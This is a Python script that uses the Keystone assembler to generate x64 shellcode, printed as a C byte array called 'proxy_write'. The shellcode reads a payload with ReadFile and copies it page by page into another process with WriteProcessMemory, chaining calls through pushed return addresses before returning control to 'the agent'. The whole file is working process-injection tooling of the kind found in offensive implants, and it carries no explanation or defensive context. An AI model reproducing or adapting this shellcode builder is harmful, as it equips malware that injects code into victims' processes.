from keystone import *
import ctypes, struct

CODE = (
    " start: "
        " lea rcx, [rip]; "
        " sub rcx, 0x07; "
        " add rcx, 0x1000;"
        " mov qword ptr [rbp+0xD0], rcx; "
        # ReadFile
        " mov rcx, [rbp+0x88]; "
        " mov rdx, [rbp+0xD0]; "
        " mov r8, [rbp+0xE0]; " # Shellcode size
        " mov r9, rsp; "
        " xor r10, r10; "
        " push r10; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0b;"
        " push rbx; "
        " mov rbx, [rbp+0x40]; "
        " push rbx; "
        " ret;  "        
        # WriteProcessMemory (1)
        " mov rcx, [rbp+0xB8];"
        " mov rdx, [rbp+0x90];"
        " mov r8, [rbp+0xD0];"
        " mov r9, 0x1000;"
        " mov r10, rbp;"
        " add r10, 0xF0;"
        " push r10; "
        " push r9; "
        " push r8; "
        " push rdx; "
        " push rcx; "
        " lea rbx, [rip]; " # ROP call function
        " add rbx, 0x0e;"
        " push rbx; "
        " mov rbx, [rbp+0x80]; "
        " push rbx; "
        " ret; "
        " mov rax, [rbp+0xF0];"
        " mov qword ptr [rbp+0x90], rax;"
        # WriteProcessMemory (2)
        " mov rdx, [rbp+0x98];"
        " mov r8, [rbp+0xD0];"
        " add r8, 0x1000; "
        " mov r9, 0x1000;"
        " mov r10, rbp;"
        " add r10, 0xF0;"
        " xor r13, r13;"
        " mov r12, [rbp+0xC8];" # Required pages
        " WriteProcessMemory: "
            " inc r13;"
            " mov rcx, [rbp+0xB8];"
            " push r10; "
            " push r9; "
            " push r8; "
            " push rdx; "
            " push rcx; "
            " lea rbx, [rip]; " # ROP call function
            " add rbx, 0x0e;"
            " push rbx; "
            " mov rbx, [rbp+0x80]; "
            " push rbx; "
            " ret; "
            " pop rcx; "
            " pop rdx; "
            " pop r8; "
            " pop r9; "
            " pop r10; "
            " add r8, 0x1000;"
            " add rdx, 0x1000;"
            " cmp r13, r12;"
            " jne WriteProcessMemory;" 
        " mov rax, [rbp+0xF0];"
        " mov qword ptr [rbp+0x98], rax;"
        # Return to the agent
        " mov rbx, [rbp+0xC0];"
        " push rbx; "
        " ret;"
        

)
ks = Ks(KS_ARCH_X86, KS_MODE_64)
encoding, count = ks.asm(CODE)
instructions = ""
i=1
for dec in encoding: 
    if(i % 20 == 0) and (i<len(encoding)):
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n")
        instructions += "\"\r\n\""
    else:
        instructions += "\\x{0:02x}".format(int(dec)).rstrip("\r\n") 
    i+=1
print("unsigned char proxy_write[] = (\r\n\"" + instructions + "\");\r\n")
print("// Size: " + str(len(encoding)))



